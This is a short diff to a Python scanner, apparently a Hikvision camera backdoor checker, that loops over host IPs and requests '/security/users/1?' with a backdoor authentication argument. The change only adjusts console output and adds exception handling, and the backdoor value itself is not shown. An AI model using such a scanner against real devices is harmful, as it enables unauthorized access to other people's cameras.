@@ -9,7 +9,7 @@ class hikTester:
         while p < len(up_host):
             ip_to_check = up_host[p]
             try:
-                sys.stdout.write("\r" + "[##]Checking " + ip_to_check)
+                sys.stdout.write("\r" + "[##]Checking " + ip_to_check+ '          ')
                 sys.stdout.flush()
                 response = requests.get('http://' + ip_to_check + '/security/users/1?' + BackdoorAuthArg)
                 if response.status_code == 200:
@@ -21,5 +21,8 @@ class hikTester:
                     pass
                 p += 1
             except requests.exceptions.ConnectionError:
+                pass
+                p += 1
+            except requests.exceptions.InvalidURL:
                 pass
                 p += 1
